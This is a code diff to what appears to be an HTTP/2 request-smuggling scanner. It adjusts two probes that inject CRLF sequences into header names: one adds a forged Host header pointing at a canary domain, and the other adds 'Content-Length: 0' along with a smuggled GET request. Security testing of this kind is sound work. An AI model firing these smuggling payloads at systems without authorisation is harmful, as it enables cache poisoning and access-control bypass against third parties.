@@ -79,8 +79,12 @@ func ScanH2HeaderNameInject(target *url.URL, base []byte, cfg config.Config, rep
 	// the injection reached the back-end.
 	if techniqueEnabled("H2.HeaderName/host-inject", cfg) {
 		canaryHost := host + ".x00.day"
+		// The injected header name carries the CRLF + Host line.
+		// Value is empty — the HPACK name already contains the full injected header
+		// ("foo: bar\r\nHost: <canary>"), so the value field should not append anything
+		// to the injected Host line (avoids producing "Host: canary: <value>").
 		injectedName := "foo: bar\r\nHost: " + canaryHost
-		extra := map[string]string{injectedName: "xyz"}
+		extra := map[string]string{injectedName: ""}
 
 		rep.Log("H2HeaderNameInject [host-inject]: target=%s canaryHost=%s", host, canaryHost)
 		dbg(cfg, "[host-inject]: name=%q", injectedName)
@@ -91,7 +95,7 @@ func ScanH2HeaderNameInject(target *url.URL, base []byte, cfg config.Config, rep
 				request.ContainsStr(resp.Body, ".x00.day")
 			dbg(cfg, "[host-inject]: status=%d host_reflected=%v", resp.Status, hostReflected)
 
-			rawProbe := fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n%s: xyz\r\n\r\n",
+			rawProbe := fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n%s:\r\n\r\n",
 				path, host, injectedName)
 
 			if hostReflected {
@@ -151,8 +155,10 @@ func ScanH2HeaderNameInject(target *url.URL, base []byte, cfg config.Config, rep
 	if techniqueEnabled("H2.HeaderName/cl-inject", cfg) {
 		canaryPath := config.EffectiveCanaryPath(cfg)
 		smuggledBody := fmt.Sprintf("GET %s HTTP/1.1\r\nFoo: ", canaryPath)
+		// Value is empty — the meaningful headers are already in the name field.
+		// A non-empty value would be appended to the last injected line ("x: x: <value>").
 		injectedName := "foo: bar\r\nContent-Length: 0\r\nx: x"
-		extra := map[string]string{injectedName: "xyz"}
+		extra := map[string]string{injectedName: ""}
 
 		rep.Log("H2HeaderNameInject [cl-inject]: target=%s canary=%s", host, canaryPath)
 		dbg(cfg, "[cl-inject]: name=%q smuggled=%q", injectedName, smuggledBody)
